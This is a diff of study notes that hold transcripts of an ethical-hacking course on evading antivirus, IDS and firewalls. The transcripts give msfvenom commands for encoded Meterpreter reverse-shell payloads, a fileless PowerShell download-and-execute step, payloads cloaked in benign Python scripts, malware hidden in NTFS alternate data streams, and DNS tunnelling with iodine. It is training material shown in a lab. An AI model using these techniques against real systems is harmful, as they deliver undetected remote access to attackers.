 [↑ Back to Table of Contents](#table-of-contents)
 
-#### Evading antivirus detection
-> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/evading-antivirus-detection?u=76281980)
+#### [Evading antivirus detection](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/evading-antivirus-detection?u=76281980)
 
 > [!transcript]- Transcript
 >
-> **[0:01](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/evading-antivirus-detection?u=76281980&t=1)** - [Instructor] As organizations acquire and deploy cybersecurity technologies to detect attack, adversaries at the same time are analyzing those same technologies to find ways to avoid being detected by them.
+> **[0:01](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/evading-antivirus-detection?u=76281980&t=1)** - [Instructor] As organizations acquire and deploy [[Cybersecurity]] technologies to detect attack, adversaries at the same time are analyzing those same technologies to find ways to avoid being detected by them.
 >
 > **[0:13](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/evading-antivirus-detection?u=76281980&t=13)** As a pen tester, it's important to be able to use evasive techniques to test how effective an organization is in detecting such attacks.
 >
@@ -2400,9 +2370,9 @@ created: 2026-05-02
 >
 > **[0:25](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/evading-antivirus-detection?u=76281980&t=25)** The first is to evade detection.
 >
-> **[0:28](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/evading-antivirus-detection?u=76281980&t=28)** There are many ways that a hacker will use to avoid being detected by an intrusion detection or prevention system.
+> **[0:28](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/evading-antivirus-detection?u=76281980&t=28)** There are many ways that a hacker will use to avoid being detected by an [[Intrusion Detection]] or prevention system.
 >
-> **[0:34](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/evading-antivirus-detection?u=76281980&t=34)** We'll look at how we can use msfvenom to hide payloads with obfuscation or encryption.
+> **[0:34](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/evading-antivirus-detection?u=76281980&t=34)** We'll look at how we can use [[Metasploit|msfvenom]] to hide payloads with obfuscation or encryption.
 >
 > **[0:41](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/evading-antivirus-detection?u=76281980&t=41)** Custom packaging is also a technique used to defeat malware signature checks.
 >
@@ -2418,18 +2388,17 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** [[Cybersecurity]] (1), [[Intrusion Detection]] (1), data (1), [[Virtualization]] (1)
+> **Frameworks & Libraries:** [[Cybersecurity]] (1), [[Intrusion Detection]] (1), [[Metasploit|Msfvenom]] (1)
 > **CLI Commands:** find (1)
 > **Definitions:** known as (1)
 > **Analogies:** such as (1)
 > **Speakers:** - [instructor] (1)
 
-#### Exotic scanning with Nmap
-> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/exotic-scanning-with-nmap?u=76281980)
+#### [Exotic scanning with Nmap](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/exotic-scanning-with-nmap?u=76281980)
 
 > [!transcript]- Transcript
 >
-> **[0:01](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/exotic-scanning-with-nmap?u=76281980&t=1)** - [Instructor] Nmap is often used to run a scan of the ports on a target.
+> **[0:01](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/exotic-scanning-with-nmap?u=76281980&t=1)** - [Instructor] [[Nmap]] is often used to run a scan of the ports on a target.
 >
 > **[0:04](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/exotic-scanning-with-nmap?u=76281980&t=4)** Internet connected systems are required by the internet standard RFC 793 to send a negative response to unexpected connections in the form of a TCP reset packet.
 >
@@ -2489,7 +2458,7 @@ created: 2026-05-02
 >
 > **[3:20](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/exotic-scanning-with-nmap?u=76281980&t=200)** One particularly useful approach, when we have access to a dual-homed target, is to bounce our scan off that target in order to access a network that it has access to, but which we can't reach directly.
 >
-> **[3:32](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/exotic-scanning-with-nmap?u=76281980&t=212)** We can do this with what's known as a loose source routing scan using Nmap's IP options.
+> **[3:32](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/exotic-scanning-with-nmap?u=76281980&t=212)** We can do this with what's known as a loose source [[Routing]] scan using Nmap's IP options.
 >
 > **[3:38](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/exotic-scanning-with-nmap?u=76281980&t=218)** To demonstrate this, I'll run it on the same network but if we were using it for real, we'd use the target subnet as the reason.
 >
@@ -2497,7 +2466,7 @@ created: 2026-05-02
 >
 > **[3:52](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/exotic-scanning-with-nmap?u=76281980&t=232)** - -IP-options, and the option we use is the L prefix on the host 192.168.1.51.
 >
-> **[4:03](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/exotic-scanning-with-nmap?u=76281980&t=243)** We'll bounce this off our Hydra server and for the reason we'll put 192.168.1.0/24
+> **[4:03](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/exotic-scanning-with-nmap?u=76281980&t=243)** We'll bounce this off our [[Hydra]] server and for the reason we'll put 192.168.1.0/24
 >
 > **[4:19](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/exotic-scanning-with-nmap?u=76281980&t=259)** and we'll run this with super-user privileges.
 >
@@ -2507,7 +2476,7 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** dns (1), [[Routing]] (1)
+> **Frameworks & Libraries:** [[Nmap]] (10), [[Hydra]] (2), [[Routing]] (1)
 > **Env Vars:** tcp (2), rfc (1), dns (1), icmp (1)
 > **Versions:** 192.168.1 (4)
 > **Ports:** port 80 (2)
@@ -2516,14 +2485,13 @@ created: 2026-05-02
 > **Definitions:** known as (1)
 > **Speakers:** - [instructor] (1)
 
-#### Obfuscating payloads with msfvenom
-> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/obfuscating-payloads-with-msfvenom?u=76281980)
+#### [Obfuscating payloads with msfvenom](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/obfuscating-payloads-with-msfvenom?u=76281980)
 
 > [!transcript]- Transcript
 >
 > **[0:01](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/obfuscating-payloads-with-msfvenom?u=76281980&t=1)** - [Instructor] When creating a payload, we need to make sure that it isn't detected as malicious by the target's firewall or IDS system.
 >
-> **[0:08](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/obfuscating-payloads-with-msfvenom?u=76281980&t=8)** To demonstrate how to do this, we'll create an obfuscated payload using the msfvenom tools encoding capability.
+> **[0:08](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/obfuscating-payloads-with-msfvenom?u=76281980&t=8)** To demonstrate how to do this, we'll create an obfuscated payload using the [[Metasploit|msfvenom]] tools encoding capability.
 >
 > **[0:16](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/obfuscating-payloads-with-msfvenom?u=76281980&t=16)** We can select one of a number of ways to obfuscate the payload.
 >
@@ -2533,7 +2501,7 @@ created: 2026-05-02
 >
 > **[0:42](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/obfuscating-payloads-with-msfvenom?u=76281980&t=42)** Meterpreter can create many different types of payload for a range of targets.
 >
-> **[0:47](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/obfuscating-payloads-with-msfvenom?u=76281980&t=47)** We'll create a Meterpreter reverse TCP payload for Windows X86, msfvenom -p windows/meterpreter/reverse_tcp
+> **[0:47](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/obfuscating-payloads-with-msfvenom?u=76281980&t=47)** We'll create a Meterpreter reverse TCP payload for [[Windows]] X86, msfvenom -p windows/meterpreter/reverse_tcp
 >
 > **[1:05](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/obfuscating-payloads-with-msfvenom?u=76281980&t=65)** - -platform windows -a x86 architecture.
 >
@@ -2547,11 +2515,11 @@ created: 2026-05-02
 >
 > **[1:57](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/obfuscating-payloads-with-msfvenom?u=76281980&t=117)** Okay, and we'll run that.
 >
-> **[2:02](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/obfuscating-payloads-with-msfvenom?u=76281980&t=122)** We've now got to cloaked payload, which should be more difficult for an intrusion detection system to detect.
+> **[2:02](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/obfuscating-payloads-with-msfvenom?u=76281980&t=122)** We've now got to cloaked payload, which should be more difficult for an [[Intrusion Detection]] system to detect.
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** [[Windows]] (3), [[Intrusion Detection]] (1)
+> **Frameworks & Libraries:** [[Metasploit|Msfvenom]] (3), [[Windows]] (3), [[Intrusion Detection]] (1)
 > **Env Vars:** ids (1), tcp (1), x86 (1), lhost (1), lport (1)
 > **Code Identifiers:** shikata_ga_nai (3), reverse_tcp (1)
 > **Speakers:** - [instructor] (1), - format (1)
@@ -2559,8 +2527,7 @@ created: 2026-05-02
 > **Versions:** 10.0.2 (1)
 > **UI Navigation:** select the (1)
 
-#### Hiding payloads in benign files
-> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-payloads-in-benign-files?u=76281980)
+#### [Hiding payloads in benign files](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-payloads-in-benign-files?u=76281980)
 
 > [!transcript]- Transcript
 >
@@ -2568,7 +2535,7 @@ created: 2026-05-02
 >
 > **[0:07](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-payloads-in-benign-files?u=76281980&t=7)** There are tricks that can be used to achieve this, however.
 >
-> **[0:10](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-payloads-in-benign-files?u=76281980&t=10)** Let's have a look at tool by Somdev which cloaks a Python payload by creating and injecting it into a benign Python script.
+> **[0:10](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-payloads-in-benign-files?u=76281980&t=10)** Let's have a look at tool by Somdev which cloaks a [[Python (Programming Language)|Python]] payload by creating and injecting it into a benign Python script.
 >
 > **[0:20](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-payloads-in-benign-files?u=76281980&t=20)** I've downloaded the script, so let's take a look at it.
 >
@@ -2576,9 +2543,9 @@ created: 2026-05-02
 >
 > **[0:29](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-payloads-in-benign-files?u=76281980&t=29)** I won't analyze this in detail but there are some interesting aspects to look at.
 >
-> **[0:34](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-payloads-in-benign-files?u=76281980&t=34)** At line 32, the script makes a connection to the Google DNS in order to find the IP address it's running from.
+> **[0:34](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-payloads-in-benign-files?u=76281980&t=34)** At line 32, the script makes a connection to the [[Google]] DNS in order to find the IP address it's running from.
 >
-> **[0:42](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-payloads-in-benign-files?u=76281980&t=42)** At line 47, we can see a call to check that msfvenom is available on the host.
+> **[0:42](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-payloads-in-benign-files?u=76281980&t=42)** At line 47, we can see a call to check that [[Metasploit|msfvenom]] is available on the host.
 >
 > **[0:50](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-payloads-in-benign-files?u=76281980&t=50)** And at lines 53 and 58, it get the IP and port from the user.
 >
@@ -2630,9 +2597,9 @@ created: 2026-05-02
 >
 > **[3:05](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-payloads-in-benign-files?u=76281980&t=185)** Okay, let's run this.
 >
-> **[3:07](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-payloads-in-benign-files?u=76281980&t=187)** The first thing we'll do is open a new terminal and set up a Metasploit listener.
+> **[3:07](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-payloads-in-benign-files?u=76281980&t=187)** The first thing we'll do is open a new terminal and set up a [[Metasploit]] listener.
 >
-> **[3:13](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-payloads-in-benign-files?u=76281980&t=193)** We'll run sudo msfconsole as we'll want to listen on a low-numbered port.
+> **[3:13](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-payloads-in-benign-files?u=76281980&t=193)** We'll run sudo [[Metasploit|msfconsole]] as we'll want to listen on a low-numbered port.
 >
 > **[3:25](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-payloads-in-benign-files?u=76281980&t=205)** We'll select the multi/handler.
 >
@@ -2656,7 +2623,7 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** [[Python (Programming Language)|Python]] (6), [[Google]] (1), dns (1)
+> **Frameworks & Libraries:** [[Python (Programming Language)|Python]] (6), [[Metasploit|Msfvenom]] (2), [[Google]] (1), [[Metasploit]] (1), [[Metasploit|Msfconsole]] (1)
 > **CLI Commands:** python (6), python3 (3), find (1), sudo (1)
 > **File Paths:** wifipw.py (6), cloak.py (2), payload.txt (1)
 > **Env Vars:** https (2), dns (1)
@@ -2665,8 +2632,7 @@ created: 2026-05-02
 > **Versions:** 10.0.2 (1)
 > **Tools:** terminal (1)
 
-#### Custom packaging of software
-> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/custom-packaging-of-software?u=76281980)
+#### [Custom packaging of software](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/custom-packaging-of-software?u=76281980)
 
 > [!transcript]- Transcript
 >
@@ -2684,7 +2650,7 @@ created: 2026-05-02
 >
 > **[0:49](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/custom-packaging-of-software?u=76281980&t=49)** An example of this is the Andromeda Gamarue Custom Packer described in this analysis by Morphisec.
 >
-> **[0:56](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/custom-packaging-of-software?u=76281980&t=56)** These forms of packers are often a challenge for automated sandbox detectors.
+> **[0:56](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/custom-packaging-of-software?u=76281980&t=56)** These [[Forms]] of packers are often a challenge for automated sandbox detectors.
 
 > [!info]- Semantic Content
 >
@@ -2693,8 +2659,7 @@ created: 2026-05-02
 > **Analogies:** such as (2)
 > **Speakers:** - [instructor] (1)
 
-#### Fileless attacks with PowerShell
-> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/fileless-attacks-with-powershell?u=76281980)
+#### [Fileless attacks with PowerShell](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/fileless-attacks-with-powershell?u=76281980)
 
 > [!transcript]- Transcript
 >
@@ -2702,13 +2667,13 @@ created: 2026-05-02
 >
 > **[0:08](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/fileless-attacks-with-powershell?u=76281980&t=8)** By doing this, it avoids the risk of being detected by a file scan.
 >
-> **[0:13](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/fileless-attacks-with-powershell?u=76281980&t=13)** PowerShell can be used to execute scripts directly in memory and is a popular choice for fileless attacks.
+> **[0:13](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/fileless-attacks-with-powershell?u=76281980&t=13)** [[Powershell]] can be used to execute scripts directly in memory and is a popular choice for fileless attacks.
 >
 > **[0:20](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/fileless-attacks-with-powershell?u=76281980&t=20)** An example of this is the PowerShell download string method, which downloads content from a remote location to a buffer in memory.
 >
 > **[0:28](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/fileless-attacks-with-powershell?u=76281980&t=28)** First of all, let's create a PowerShell script payload.
 >
-> **[0:33](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/fileless-attacks-with-powershell?u=76281980&t=33)** msfvenom -p windows/x64 /meterpreter_reverse_http
+> **[0:33](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/fileless-attacks-with-powershell?u=76281980&t=33)** [[Metasploit|msfvenom]] -p [[Windows]]/x64 /meterpreter_reverse_http
 >
 > **[0:50](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/fileless-attacks-with-powershell?u=76281980&t=50)** and we'll make it PSH format.
 >
@@ -2718,13 +2683,13 @@ created: 2026-05-02
 >
 > **[1:17](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/fileless-attacks-with-powershell?u=76281980&t=77)** Okay, we now need to serve this on a website.
 >
-> **[1:19](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/fileless-attacks-with-powershell?u=76281980&t=79)** So let's use our Python simple HTTP server.
+> **[1:19](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/fileless-attacks-with-powershell?u=76281980&t=79)** So let's use our [[Python (Programming Language)|Python]] simple HTTP server.
 >
 > **[1:24](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/fileless-attacks-with-powershell?u=76281980&t=84)** Python -M SimpleHTTPServer.
 >
 > **[1:32](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/fileless-attacks-with-powershell?u=76281980&t=92)** Now we need to set up a meterpreter listener for PowerShell.
 >
-> **[1:36](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/fileless-attacks-with-powershell?u=76281980&t=96)** So in our second terminal, we'll run sudo msfconsole, as we need to set up a listener on a low-numbered port.
+> **[1:36](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/fileless-attacks-with-powershell?u=76281980&t=96)** So in our second terminal, we'll run sudo [[Metasploit|msfconsole]], as we need to set up a listener on a low-numbered port.
 >
 > **[1:57](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/fileless-attacks-with-powershell?u=76281980&t=117)** We'll use exploit/ multi/handler.
 >
@@ -2740,7 +2705,7 @@ created: 2026-05-02
 >
 > **[2:46](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/fileless-attacks-with-powershell?u=76281980&t=166)** We now need to execute a remote command on the target through some form of technical or social engineering exploit.
 >
-> **[2:52](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/fileless-attacks-with-powershell?u=76281980&t=172)** I'll simulate this by entering the remote command at the command line in my Windows 10 target.
+> **[2:52](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/fileless-attacks-with-powershell?u=76281980&t=172)** I'll simulate this by entering the remote command at the command line in my [[Windows 10]] target.
 >
 > **[3:00](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/fileless-attacks-with-powershell?u=76281980&t=180)** Powershell.exe - ep Bypass
 >
@@ -2762,7 +2727,7 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** [[Powershell]] (6), [[Windows]] (3), [[Python (Programming Language)|Python]] (2), [[Engineering]] (1), [[Windows 10]] (1)
+> **Frameworks & Libraries:** [[Powershell]] (6), [[Windows]] (3), [[Python (Programming Language)|Python]] (2), [[Metasploit|Msfvenom]] (1), [[Metasploit|Msfconsole]] (1)
 > **Tools:** powershell (6), terminal (1), command line (1)
 > **Env Vars:** http (3), psh (1), lhost (1), lport (1), windev2002eval (1)
 > **CLI Commands:** python (2), make (1), sudo (1)
@@ -2771,8 +2736,7 @@ created: 2026-05-02
 > **Ports:** port 80 (1), :8000 (1)
 > **Definitions:** is a  (1), is called (1)
 
-#### Hiding with the cloak of invisibility
-> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-with-the-cloak-of-invisibility?u=76281980)
+#### [Hiding with the cloak of invisibility](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-with-the-cloak-of-invisibility?u=76281980)
 
 > [!transcript]- Transcript
 >
@@ -2784,7 +2748,7 @@ created: 2026-05-02
 >
 > **[0:13](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-with-the-cloak-of-invisibility?u=76281980&t=13)** I'm in a command shell and I'll go into my local user application directory by typing cd appdata\local.
 >
-> **[0:23](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-with-the-cloak-of-invisibility?u=76281980&t=23)** And I'll go into the Windows sub-sub-sub-directory by typing cd microsoft\windows.
+> **[0:23](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-with-the-cloak-of-invisibility?u=76281980&t=23)** And I'll go into the [[Windows]] sub-sub-sub-directory by typing cd [[Microsoft]]\windows.
 >
 > **[0:35](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/hiding-with-the-cloak-of-invisibility?u=76281980&t=35)** When I list the contents of the directory, there's a number of files and folders, but there's no history sub-directory.
 >
@@ -2818,15 +2782,14 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** [[Windows]] (3), [[Microsoft]] (3), cd (2), application (1)
+> **Frameworks & Libraries:** [[Windows]] (3), [[Microsoft]] (3)
 > **CLI Commands:** cd (2)
 > **Env Vars:** clsid (1), uiclsid (1)
 > **File Paths:** desktop.ini (1)
 > **Definitions:** is a  (1)
 > **Speakers:** - [instructor] (1)
 
-#### Embedding malware in an alternate data stream
-> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/embedding-malware-in-an-alternate-data-stream?u=76281980)
+#### [Embedding malware in an alternate data stream](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/embedding-malware-in-an-alternate-data-stream?u=76281980)
 
 > [!transcript]- Transcript
 >
@@ -2846,7 +2809,7 @@ created: 2026-05-02
 >
 > **[0:35](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/embedding-malware-in-an-alternate-data-stream?u=76281980&t=35)** These are called alternate data streams.
 >
-> **[0:38](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/embedding-malware-in-an-alternate-data-stream?u=76281980&t=38)** Importantly, Windows only recognizes the $DATA section, so data in any alternate data stream is hidden.
+> **[0:38](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/embedding-malware-in-an-alternate-data-stream?u=76281980&t=38)** Importantly, [[Windows]] only recognizes the $DATA section, so data in any alternate data stream is hidden.
 >
 > **[0:47](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/embedding-malware-in-an-alternate-data-stream?u=76281980&t=47)** I've created a text file called ode.txt and we can see the poetic contents.
 >
@@ -2904,7 +2867,7 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** data (13), [[Windows]] (7), application (1)
+> **Frameworks & Libraries:** [[Windows]] (7)
 > **File Paths:** ode.txt (9), hidden.txt (3), adsfile.txt (2)
 > **Env Vars:** ntfs (2), data (2), exe (1), dll (1)
 > **Definitions:** known as (1), is a  (1)
@@ -2912,8 +2875,7 @@ created: 2026-05-02
 > **Tools:** command line (1)
 > **Speakers:** - [instructor] (1)
 
-#### Tunneling through DNS with iodine
-> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/tunneling-through-dns-with-iodine?u=76281980)
+#### [Tunneling through DNS with iodine](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/tunneling-through-dns-with-iodine?u=76281980)
 
 > [!transcript]- Transcript
 >
@@ -2927,13 +2889,13 @@ created: 2026-05-02
 >
 > **[0:42](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/tunneling-through-dns-with-iodine?u=76281980&t=42)** Okay, we've instructed iodine to create a new virtual network using the IP address 10.0.0.1 with a DNS name of [test.com](https://test.com).
 >
-> **[0:52](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/tunneling-through-dns-with-iodine?u=76281980&t=52)** Let's check in Wireshark to confirm this.
+> **[0:52](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/tunneling-through-dns-with-iodine?u=76281980&t=52)** Let's check in [[Wireshark]] to confirm this.
 >
 > **[0:55](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/tunneling-through-dns-with-iodine?u=76281980&t=55)** We can see we've now got a new network adapter called DNS0.
 >
 > **[1:00](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/tunneling-through-dns-with-iodine?u=76281980&t=60)** Let's start capturing traffic on that.
 >
-> **[1:07](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/tunneling-through-dns-with-iodine?u=76281980&t=67)** I've already installed iodine on Hydra, so let's use the client to connect to our server using the same DNS name: sudo iodine, minus F, minus R, and our server's running on 192.168.1.249 with a DNS name of [test.com](https://test.com) and we'll put in the password that we put in on the server.
+> **[1:07](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/tunneling-through-dns-with-iodine?u=76281980&t=67)** I've already installed iodine on [[Hydra]], so let's use the client to connect to our server using the same DNS name: sudo iodine, minus F, minus R, and our server's running on 192.168.1.249 with a DNS name of [test.com](https://test.com) and we'll put in the password that we put in on the server.
 >
 > **[1:38](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/tunneling-through-dns-with-iodine?u=76281980&t=98)** Okay, we are now set up.
 >
@@ -2957,7 +2919,7 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** dns (6), traffic (3), [[Wireshark]] (2), data (1)
+> **Frameworks & Libraries:** [[Wireshark]] (2), [[Hydra]] (2)
 > **Env Vars:** dns (6), dns0 (2), icmp (2)
 > **Versions:** 10.0.0 (3), 192.168.1 (2), 192.168.249 (1)
 > **URLs:** [test.com](https://test.com) (3)
@@ -2965,8 +2927,7 @@ created: 2026-05-02
 > **Prerequisites:** set up (1)
 > **Speakers:** - [instructor] (1)
 
-#### Checking for oversight
-> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/checking-for-oversight?u=76281980)
+#### [Checking for oversight](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/checking-for-oversight?u=76281980)
 
 > [!transcript]- Transcript
 >
@@ -2992,7 +2953,6 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** [[Virtualization]] (2)
 > **Analogies:** such as (1)
 > **Speakers:** - [instructor] (1)
 
@@ -3001,8 +2961,7 @@ created: 2026-05-02
 
 [↑ Back to Table of Contents](#table-of-contents)
 
-#### Next steps
-> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/next-steps-2?u=76281980)
+#### [Next steps](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/next-steps-2?u=76281980)
 
 > [!transcript]- Transcript
 >
@@ -3010,21 +2969,21 @@ created: 2026-05-02
 >
 > **[0:04](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/next-steps-2?u=76281980&t=4)** I hope you enjoyed learning about perimeter defenses.
 >
-> **[0:08](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/next-steps-2?u=76281980&t=8)** There's always something new in cybersecurity and if you're interested in learning more, then check out the full cybersecurity ethical hacking segment of the library, where new security testing courses are added regularly.
+> **[0:08](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/next-steps-2?u=76281980&t=8)** There's always something new in [[Cybersecurity]] and if you're interested in learning more, then check out the full cybersecurity [[Ethical Hacking]] segment of the library, where new [[Security Testing]] courses are added regularly.
 >
 > **[0:21](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/next-steps-2?u=76281980&t=21)** You'll find a range of courses on ethical hacking and security, in general.
 >
-> **[0:26](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/next-steps-2?u=76281980&t=26)** I'd like to invite you to visit my LinkedIn Learning page and check out my ethical hacking, security, and programming courses.
